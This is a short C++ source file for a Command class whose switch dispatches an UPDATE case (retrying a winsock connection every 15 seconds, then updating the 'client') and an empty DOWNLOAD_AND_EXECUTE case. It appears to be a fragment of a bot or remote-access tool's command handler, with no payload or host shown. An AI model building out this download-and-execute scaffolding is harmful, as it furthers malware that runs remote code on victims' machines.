#include "stdafx.h"
#include "Command.h"
#include "Connection.h"

Command::Command(unsigned char WhatShouldIDo)
{
	this->ToDo = WhatShouldIDo;
}

void Command::Make()
{
	switch (this->ToDo)
	{
	case UPDATE:
	{
		NewConnection Connection;
		Connection.run_winsock();
		while (!Connection.create_socket())Sleep(15000);
		Connection.UpdateClient();
		break;
	}
	case DOWNLOAD_AND_EXECUTE:
	{
		break;
	}
	}
}
